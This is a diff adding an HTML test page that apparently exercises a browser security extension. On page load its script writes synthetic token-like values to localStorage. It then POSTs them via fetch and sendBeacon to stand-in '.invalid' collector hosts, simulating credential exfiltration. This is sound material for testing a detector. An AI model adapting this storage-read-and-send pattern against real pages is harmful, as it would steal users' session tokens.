@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Dangerous Test Site Fixture</title>
+  <style>
+    body {
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Тестовый сайт</h1>
+    <div>
+      <button id="runBtn" type="button">Запустить сценарий</button>
+      <button id="resetBtn" type="button">Очистить тестовые ключи</button>
+    </div>
+  </main>
+
+  <script>
+    const runBtn = document.getElementById('runBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const TEST_KEYS = [
+      'auth_token',
+      'session_jwt',
+      'refresh_secret',
+      'csrf_token',
+      'credential_blob',
+      'profile_cache',
+      'tracking_state'
+    ];
+
+    function setStatus(lines) {
+      void lines;
+    }
+
+    function randomEncoded(size) {
+      const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+      let out = '';
+      for (let i = 0; i < size; i += 1) {
+        out += alphabet[(Math.random() * alphabet.length) | 0];
+      }
+      return out + '==';
+    }
+
+    function createPayload(label, size) {
+      const head = label + '_' + Date.now() + '_';
+      return head + randomEncoded(Math.max(64, size - head.length));
+    }
+
+    function installSuspiciousListeners() {
+      window.addEventListener('beforeunload', () => {});
+      window.addEventListener('unload', () => {});
+      window.addEventListener('pagehide', () => {});
+      document.addEventListener('visibilitychange', () => {});
+      window.addEventListener('storage', () => {});
+    }
+
+    function installFastTimers() {
+      window.setTimeout(() => {
+        document.body.dataset.fixturePulse = String(Date.now());
+      }, 120);
+
+      window.setInterval(() => {
+        document.body.dataset.fixtureBeat = String(Date.now());
+      }, 600);
+    }
+
+    function writeSensitiveStorageBurst() {
+      const entries = [
+        ['auth_token', createPayload('auth', 2600)],
+        ['session_jwt', createPayload('jwt', 2500)],
+        ['refresh_secret', createPayload('refresh', 2400)],
+        ['csrf_token', createPayload('csrf', 2350)],
+        ['credential_blob', createPayload('cred', 2450)],
+        ['profile_cache', JSON.stringify({ user: 'fixture', role: 'qa', ts: Date.now() })],
+        ['tracking_state', createPayload('track', 800)]
+      ];
+
+      entries.forEach(([key, value]) => localStorage.setItem(key, value));
+      sessionStorage.setItem('session_probe', createPayload('session', 512));
+      return entries.length;
+    }
+
+    async function fireNetworkSignals() {
+      const fetchBodies = [
+        JSON.stringify({ token: localStorage.getItem('auth_token'), step: 'one' }),
+        JSON.stringify({ session: localStorage.getItem('session_jwt'), step: 'two' }),
+        'blob=' + encodeURIComponent(localStorage.getItem('credential_blob') || '')
+      ];
+
+      const urls = [
+        'https://collector.invalid/api/ingest',
+        'https://api-risk.invalid/v1/session',
+        'https://gateway-sink.invalid/graphql'
+      ];
+
+      const tasks = urls.map((url, index) =>
+        fetch(url, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: fetchBodies[index]
+        }).catch(() => null)
+      );
+
+      try {
+        navigator.sendBeacon(
+          'https://beacon-risk.invalid/api/beacon',
+          createPayload('beacon', 900)
+        );
+      } catch (_) {}
+
+      await Promise.allSettled(tasks);
+    }
+
+    async function runFixture() {
+      setStatus([
+        'Сценарий запущен.',
+        '1. Вешаем lifecycle hooks и быстрые таймеры.',
+        '2. Пишем чувствительные ключи в localStorage.',
+        '3. Отправляем кросс-доменные POST на .invalid.'
+      ]);
+
+      installSuspiciousListeners();
+      installFastTimers();
+      const count = writeSensitiveStorageBurst();
+      await fireNetworkSignals();
+
+      setStatus([
+        'Сценарий завершён.',
+        'Создано тестовых ключей: ' + count,
+        'Откройте popup/options расширения и проверьте risk/score.',
+        'Если включён local mode + autoEncrypt + ключ шифрования, записи должны перейти в encrypted_*.'
+      ]);
+    }
+
+    function resetFixture() {
+      TEST_KEYS.forEach((key) => {
+        localStorage.removeItem(key);
+        localStorage.removeItem('encrypted_' + key);
+      });
+      localStorage.removeItem('encrypted_profile_cache');
+      localStorage.removeItem('encrypted_tracking_state');
+      sessionStorage.removeItem('session_probe');
+      setStatus('Тестовые ключи удалены.');
+    }
+
+    runBtn.addEventListener('click', () => {
+      void runFixture();
+    });
+
+    resetBtn.addEventListener('click', resetFixture);
+
+    window.addEventListener('load', () => {
+      window.setTimeout(() => {
+        void runFixture();
+      }, 900);
+    });
+  </script>
+</body>
+</html>
